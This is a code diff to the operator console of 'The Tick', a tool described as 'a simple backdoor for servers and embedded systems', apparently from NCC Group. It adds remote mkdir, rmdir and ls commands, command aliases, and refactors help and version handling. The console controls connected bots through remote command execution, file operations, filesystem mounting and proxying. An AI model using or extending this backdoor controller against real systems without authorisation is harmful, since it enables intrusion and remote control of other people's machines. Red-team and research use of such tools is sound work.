@@ -13,17 +13,51 @@ http://www.github.com/nccgroup/thetick
 See the LICENSE file for further details.
 """
 
-TICK_VERSION = "0.2"
+# Our version.
+TICK_VERSION = (0, 2)
+
+# Minimum Python version required.
+MIN_PYTHON = (3, 8)
 
 ##############################################################################
 # Imports and other module initialization.
 
+# Check the version of Python.
+# We must do this before anything else.
+import sys
+if sys.version_info < MIN_PYTHON:
+    sys.exit("Python %s.%s or later is required." % MIN_PYTHON)
+
 # This namespace is pretty cluttered so make sure
 # "from tick import *" doesn't make too much of a mess.
-__all__ = ["Listener", "Console", "BotError"]
+__all__ = [
+
+    # The main class and function.
+    "Console",
+    "main",
+
+    # The bot class and its associated exception class.
+    "Bot",
+    "BotError",
+
+    # The listener class where bots will connect to.
+    "Listener",
+
+    # Various helper classes.
+    "RemoteShell",
+    "TCPForward",
+    "SOCKSProxy",
+    "FUSEThread",
+    "FUSEProcess",
+    "FUSEHandler",
+
+    # Useful global variables.
+    "TICK_VERSION",
+    "ANSI_ENABLED",
+    "FUSE_ENABLED",
+]
 
 # Standard imports...
-import sys
 import readline
 import os
 import os.path
@@ -51,23 +85,6 @@ from subprocess import check_output, check_call, CalledProcessError
 from collections import namedtuple
 from base64 import b64decode
 
-# Determine how OS level dependencies are installed.
-# We're not actually gonna run this command, it's just for show.
-from platform import platform
-PLATFORM = platform()
-if "Ubuntu" in PLATFORM:
-    APT = "sudo apt install"
-elif "Debian" in PLATFORM:
-    APT = "sudo apt-get install"
-elif "Fedora" in PLATFORM:
-    APT = "dnf install"
-elif "CentOS" in PLATFORM:
-    APT = "yum install"
-elif "RedHat" in PLATFORM:
-    APT = "yum install"
-else:
-    APT = "sudo apt-get install"    # we don't know :(
-
 # This is our first dependency and we check it now so
 # we know if we can use colors to show errors later.
 try:
@@ -75,13 +92,13 @@ try:
 
     # Disable colors if requested.
     #
+    # Unfortunately this also disables all the other nifty
+    # console tricks we can do with ANSI escapes too. :(
+    #
     # Note that we have do do this here rather than
     # when parsing the command line arguments, since
     # several error conditions would happen before that.
     # or even withing argparse itself.
-    #
-    # Unfortunately this also disables all the other nifty
-    # console tricks we can do with ANSI escapes too. :(
 
     if "--no-color" in sys.argv:
         ANSI_ENABLED = False
@@ -115,20 +132,39 @@ except ImportError:
 # Still, let's make it optional and just disable the mount command if missing.
 # That's because we depend on the distro, as it simply cannot be installed from pip.
 try:
+    from platform import platform
+    PLATFORM = platform()
+    if "Ubuntu" in PLATFORM:
+        APT = "sudo apt install"
+    elif "Debian" in PLATFORM:
+        APT = "sudo apt-get install"
+    elif "Fedora" in PLATFORM:
+        APT = "dnf install"
+    elif "CentOS" in PLATFORM:
+        APT = "yum install"
+    elif "RedHat" in PLATFORM:
+        APT = "yum install"
+    else:
+        APT = "sudo apt-get install"    # we don't know :(
+    del PLATFORM
+except ImportError:
+    APT = "sudo apt-get install"    # should never happen...
+try:
     import fuse
     if not hasattr(fuse, '__version__'):
         print("Broken dependency: "+ Style.BRIGHT + Fore.RED + "fuse" + Style.RESET_ALL)
         print("It seems to be an old or incompatible version.")
         print("We recommend installing the version that comes with your Linux distribution:")
         print(Style.BRIGHT + Fore.BLUE + "  " + APT + " python3-fuse" + Style.RESET_ALL)
-        HAVE_FUSE = False
+        FUSE_ENABLED = False
     else:
         fuse.fuse_python_api = (0, 2)
-        HAVE_FUSE = True
+        FUSE_ENABLED = True
 except ImportError:
-    HAVE_FUSE = False
+    FUSE_ENABLED = False
     print("Missing dependency: "+ Style.BRIGHT + Fore.RED + "fuse" + Style.RESET_ALL)
     print(Style.BRIGHT + Fore.BLUE + "  " + APT + " python3-fuse" + Style.RESET_ALL)
+del APT
 
 ##############################################################################
 # Some good old blobs. Nothing says "trust this code and run it" like blobs.
@@ -1252,7 +1288,7 @@ class SOCKSProxy(Thread):
 # This way we keep the FUSE part neatly separated from our process,
 # while at the same time ensuring the main process with the console
 # is the one actually communicating with the bots.
-if HAVE_FUSE:
+if FUSE_ENABLED:
 
     class FUSEThread(Thread):
 
@@ -1578,11 +1614,8 @@ if HAVE_FUSE:
 class Console(Cmd):
     "Interactive text console to manage The Tick bots."
 
-    # Header for help page.
-    doc_header = 'Available commands (type help * or help <command>)'
-
     # Undocumented commands. We don't want them showing up on help.
-    hidden = ["EOF", "dbg"]
+    hidden = ["EOF", "quit"]
 
     def __init__(self, args = ()):
 
@@ -1627,11 +1660,12 @@ class Console(Cmd):
             return arg
 
         # All the supported command line switches go here.
-        parser = ArgumentParser(formatter_class=ColorHelpFormatter,
+        parser = ArgumentParser(formatter_class=ColorHelpFormatter, add_help=False,
                 prog=Fore.GREEN+Style.BRIGHT+os.path.basename(sys.argv[0])+Style.RESET_ALL,
                 description="A simple backdoor for servers and embedded systems.")
-        parser.add_argument("--version", action="version",
-                version="The Tick, by Mario Vilas, version "+Fore.YELLOW+TICK_VERSION+Style.RESET_ALL)
+        parser.add_argument("--help", action="help", help="Show this help message and exit.")
+        parser.add_argument("--version", action="version", help="Show the version number and exit.",
+                version="The Tick, by Mario Vilas, version "+Fore.YELLOW+("%s.%s"%TICK_VERSION)+Style.RESET_ALL)
         parser.add_argument("-b", "--bind", dest="bind_addr", default="0.0.0.0",
                 metavar=Fore.BLUE+Style.BRIGHT+"ADDRESS"+Style.RESET_ALL,
                 help="IP address to bind all the listeners to [default: "+Fore.YELLOW+"0.0.0.0"+Style.RESET_ALL+"]")
@@ -1725,15 +1759,6 @@ class Console(Cmd):
             self.listener.kill()
         except Exception:
             print_exc()
-
-    # This prevents the help from showing the undocumented commands.
-    def get_names(self):
-        names = Cmd.get_names(self)
-        for undoc in self.hidden:
-            undoc = "do_" + undoc
-            if undoc in names:
-                names.remove(undoc)
-        return names
 
     # This method is called by the listener whenever a new bot connects.
     # It will show a message to the user right below the command prompt.
@@ -1836,6 +1861,26 @@ class Console(Cmd):
         except Exception:
             print_exc()
 
+    # Customize the line parser since the default behaviour is problematic for us.
+    # The biggest problem is the "!" turns into the "shell" command, and we need
+    # it to be "exec" instead. Also added some more syntactic sugar.
+    def parseline(self, line):
+        line = line.strip()
+        if not line:
+            return None, None, line
+        elif line[0] == '?':
+            line = 'help ' + line[1:]
+        elif line[0] == '!':
+            line = 'exec ' + line[1:]
+        elif line[0] == '.':
+            line = 'python ' + line[1:]
+        cmd, arg, line = Cmd.parseline(self, line)
+        if cmd:
+            completed = self.completenames(cmd)
+            if len(completed) == 1:
+                cmd = completed[0]  # you can type less now :)
+        return cmd, arg, line
+
     # Default behaviour for the base class is to repeat the last command if
     # a blank line is given. This is quite dangerous so we're disabling it.
     def emptyline(self):
@@ -1862,6 +1907,10 @@ class Console(Cmd):
     @property
     def prompt(self):
 
+        # Note: for some to me unexplained reason I only noticed after the Py3k port,
+        # this function must sanitize the ANSI escape strings, otherwise they bypass
+        # colorama's checks and end up getting printed even when we disabled ANSI.
+
         # If the currently selected bot is not alive, deselect it automatically.
         # This may happen for example if the bot dies after executing a command,
         # the connection is dropped unexpectedly, or the command was one of those
@@ -1871,13 +1920,17 @@ class Console(Cmd):
 
         # If no bot is selected, show the corresponding prompt.
         if self.current is None:
-            return "\x01" + Fore.RED + "\x02" + "[No bot selected] " + "\x01" + Style.RESET_ALL + "\x02"
+            if ANSI_ENABLED:
+                return "\x01" + Fore.RED + "\x02" + "[No bot selected] " + "\x01" + Style.RESET_ALL + "\x02"
+            return "[No bot selected] "
 
         # If a bot is selected, show its info in the prompt.
         bot = self.current
         index = list(self.listener.bots.keys()).index(bot.uuid)
         addr = bot.from_addr[0]
-        return "\x01" + Fore.GREEN + Style.BRIGHT + "\x02" + ("[Bot %d: %s] " % (index, addr)) + "\x01" + Style.RESET_ALL + "\x02"
+        if ANSI_ENABLED:
+            return "\x01" + Fore.GREEN + Style.BRIGHT + "\x02" + ("[Bot %d: %s] " % (index, addr)) + "\x01" + Style.RESET_ALL + "\x02"
+        return "[Bot %d: %s] " % (index, addr)
 
     # Helper function to tell if a bot is busy.
     # If no bot is given, the currently selected bot is tested.
@@ -1909,17 +1962,32 @@ class Console(Cmd):
     With arguments, shows the help for one or more commands.
     Use "\x1b[34m\x1b[1mhelp *\x1b[0m" to show help for all commands at once.
     The question mark "\x1b[34m\x1b[1m?\x1b[0m" can be used as an alias for "\x1b[34m\x1b[1mhelp\x1b[0m".\n"""
+        commands = self.get_names()
+        commands = [ x[3:] for x in commands if x.startswith("do_") ]
+        commands = [ x for x in commands if x not in self.hidden ]
+        commands.sort()
         if not line.strip():
-            Cmd.do_help(self, line)
+            print("")
+            print("Available commands (type " + \
+                Fore.YELLOW + Style.BRIGHT + "help *" + Style.RESET_ALL + " or " + \
+                Fore.YELLOW + Style.BRIGHT + "help" + Style.RESET_ALL + " <" + \
+                Fore.BLUE + Style.BRIGHT + "command" + Style.RESET_ALL + ">)")
+            print("==================================================")
+            self.columnize(commands)
+            print("")
         else:
-            commands = split(line, comments=True)
-            if commands == ["*"]:
-                commands = self.get_names()
-                commands = [ x[3:] for x in commands if x.startswith("do_") ]
-                commands.sort()
-            last = len(commands) - 1
+            args = split(line, comments=True)
+            if "*" in args:
+                args = commands
+            last = len(args) - 1
             index = 0
-            for cmd in commands:
+            for cmd in args:
+                if cmd not in commands:
+                    completed = self.completenames(cmd)
+                    if len(completed) == 1:
+                        cmd = completed[0]
+                #if cmd == "quit":
+                #    cmd = "exit"
                 Cmd.do_help(self, cmd)
                 if index < last:
                     print(Fore.RED + Style.BRIGHT + ("-" * 79) + Style.RESET_ALL)
@@ -1928,6 +1996,7 @@ class Console(Cmd):
     def do_exit(self, line):
         """
     \x1b[32m\x1b[1mexit\x1b[0m
+    \x1b[32m\x1b[1mquit\x1b[0m
 
     Exit the command interpreter.
     This command takes no arguments.\n"""
@@ -1941,6 +2010,10 @@ class Console(Cmd):
         # The context manager will take care of cleaning up.
         return True
 
+    # Alias :)
+    do_quit = do_exit
+
+    # Trick to get Ctrl+D to work as the exit command.
     def do_EOF(self, line):
         print("")
         return self.do_exit(line)
@@ -2243,13 +2316,122 @@ class Console(Cmd):
         # Perform the operation.
         self.current.file_unlink(remote_file)
 
+    def do_mkdir(self, line):
+        """
+    \x1b[32m\x1b[1mmkdir\x1b[0m <\x1b[34m\x1b[1mremote directory\x1b[0m>
+
+    Create a directory.\n"""
+
+        # A bot must be selected.
+        if self.current is None:
+            print(Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL)
+            return
+
+        # The bot must not be busy.
+        if self.is_bot_busy():
+            print(Fore.YELLOW + "Bot is busy" + Style.RESET_ALL)
+            return
+
+        # Parse the arguments, on error show help.
+        try:
+            pathname, = split(line, comments=True)
+        except Exception:
+            self.onecmd("help mkdir")
+            return
+
+        # Perform the operation.
+        self.current.file_mkdir(pathname)
+
+    def do_rmdir(self, line):
+        """
+    \x1b[32m\x1b[1mrmdir\x1b[0m <\x1b[34m\x1b[1mremote directory\x1b[0m>
+
+    Delete a directory. Must be empty.\n"""
+
+        # A bot must be selected.
+        if self.current is None:
+            print(Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL)
+            return
+
+        # The bot must not be busy.
+        if self.is_bot_busy():
+            print(Fore.YELLOW + "Bot is busy" + Style.RESET_ALL)
+            return
+
+        # Parse the arguments, on error show help.
+        try:
+            pathname, = split(line, comments=True)
+        except Exception:
+            self.onecmd("help rmdir")
+            return
+
+        # Perform the operation.
+        self.current.file_rmdir(pathname)
+
+    def do_ls(self, line):
+        """
+    \x1b[32m\x1b[1mls\x1b[0m
+    \x1b[32m\x1b[1mls\x1b[0m <\x1b[34m\x1b[1mremote directory\x1b[0m>
+
+    List the contents of a remote directory.\n"""
+
+        # A bot must be selected.
+        if self.current is None:
+            print(Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL)
+            return
+
+        # The bot must not be busy.
+        if self.is_bot_busy():
+            print(Fore.YELLOW + "Bot is busy" + Style.RESET_ALL)
+            return
+
+        # Parse the arguments, on error show help.
+        args = split(line, comments=True)
+        if not args:
+            pathname = "."
+        elif len(args) == 1:
+            pathname = args[0]
+        else:
+            self.onecmd("help ls")
+            return
+
+        # Get the list of files.
+        b_remote_files = self.current.file_readdir(pathname)
+        remote_files = []
+        for x in b_remote_files:
+            if x in (b".", b".."):
+                continue
+            try:
+                x = x.decode("utf8", "replace")
+            except UnicodeError:
+                try:
+                    x = x.decode("utf8", "ignore")
+                except Exception:
+                    x = repr(x)[1:-1]
+            remote_files.append(x)
+        remote_files.sort()
+
+        # Try to adjust the output to the console size.
+        # On error just ignore it and go with the default.
+        try:
+            term_width = int(check_output('stty size 2>/dev/null', shell=True).decode("utf8", "ignore").split(' ')[1])
+            if term_width > 160: term_width = 140
+            elif term_width < 80: term_width = 80
+        except Exception:
+            term_width = 80
+            #raise  # XXX DEBUG
+
+        # Show the list of files in columns.
+        self.columnize(remote_files, term_width)
+
     def do_exec(self, line):
         """
     \x1b[32m\x1b[1mexec\x1b[0m <\x1b[34m\x1b[1mcommand line\x1b[0m>
 
     Execute a non interactive command.
     The output of the command may be truncated if it exceeds memory usage.
-    This will be more noticeable on embedded platforms.\n"""
+    This will be more noticeable on embedded platforms.
+    The exclamation mark "\x1b[34m\x1b[1m!\x1b[0m" can be used as an alias for "\x1b[34m\x1b[1mexec\x1b[0m".\n"""
 
         # A bot must be selected.
         if self.current is None:
@@ -2677,17 +2859,17 @@ class Console(Cmd):
             raise Exception("internal error")
 
     # Mount and umount commands are only defined if we have FUSE installed.
-    if HAVE_FUSE:
+    if FUSE_ENABLED:
 
         def do_mount(self, line):
             """
-        \x1b[32m\x1b[1mmount\x1b[0m
-        \x1b[32m\x1b[1mmount\x1b[0m <\x1b[34m\x1b[1mmount point\x1b[0m>
-        \x1b[32m\x1b[1mmount\x1b[0m <\x1b[34m\x1b[1mmount point\x1b[0m> [\x1b[34m\x1b[1moptions...\x1b[0m]
+    \x1b[32m\x1b[1mmount\x1b[0m
+    \x1b[32m\x1b[1mmount\x1b[0m <\x1b[34m\x1b[1mmount point\x1b[0m>
+    \x1b[32m\x1b[1mmount\x1b[0m <\x1b[34m\x1b[1mmount point\x1b[0m> [\x1b[34m\x1b[1moptions...\x1b[0m]
 
-        Mounts the target machine's filesystem into a local directory.
-        Any access to that directory will be transparently forwarded to the bot.
-        When invoked with no arguments, list the existing mounted points.\n"""
+    Mounts the target machine's filesystem into a local directory.
+    Any access to that directory will be transparently forwarded to the bot.
+    When invoked with no arguments, list the existing mounted points.\n"""
 
             # Parse the command arguments.
             try:
@@ -2793,9 +2975,9 @@ class Console(Cmd):
 
         def do_umount(self, line):
             """
-        \x1b[32m\x1b[1mumount\x1b[0m <\x1b[34m\x1b[1mmount point\x1b[0m>
+    \x1b[32m\x1b[1mumount\x1b[0m <\x1b[34m\x1b[1mmount point\x1b[0m>
 
-        Unmounts a filesystem mounted with the "mount" command.\n"""
+    Unmounts a filesystem mounted with the "mount" command.\n"""
 
             # Parse the command arguments.
             try:
@@ -2864,19 +3046,20 @@ class Console(Cmd):
 
     # Spawns a Python shell with some handy local variables.
     # This is probably only useful for debugging.
-    def do_dbg(self, arg):
+    def do_python(self, arg):
         """
-    \x1b[32m\x1b[1mdbg\x1b[0m
+    \x1b[32m\x1b[1mpython\x1b[0m
+    \x1b[32m\x1b[1mpython\x1b[0m <\x1b[34m\x1b[1msentence\x1b[0m>
 
-        Spawn a python interpreter with access to all of the console's internal
-        variables. Note that the console will be frozen while this runs.
-        """
-        banner = ('Python %s on The Tick %s\nType "help", "copyright", '
+    Spawn a python interpreter with access to all of the console's internal
+    variables. Note that the console will be frozen while this runs.
+    A preceding dot "\x1b[34m\x1b[1m.\x1b[0m" can be used as an alias for "\x1b[34m\x1b[1mpython\x1b[0m".\n"""
+        banner = ('Python %s on The Tick %s.%s\nType "help", "copyright", '
                  '"credits" or "license" for more information.')
         platform = sys.version
         if " " in platform:
             platform = platform[:platform.find(" ")]
-        banner = banner % (platform, TICK_VERSION)
+        banner = banner % ((platform,) + TICK_VERSION)
         local = {
             '__name__'  : '__console__',
             'exit'      : self._python_exit,
@@ -2885,7 +3068,11 @@ class Console(Cmd):
         }
         local.update(globals())
         try:
-            code.interact(banner=banner, local=local)
+            if arg:
+                c = code.InteractiveInterpreter(locals=local)
+                c.runsource(arg + "\n")
+            else:
+                code.interact(banner=banner, exitmsg="", local=local)
         except SystemExit:
             # We need to catch it so it doesn't kill our program.
             pass
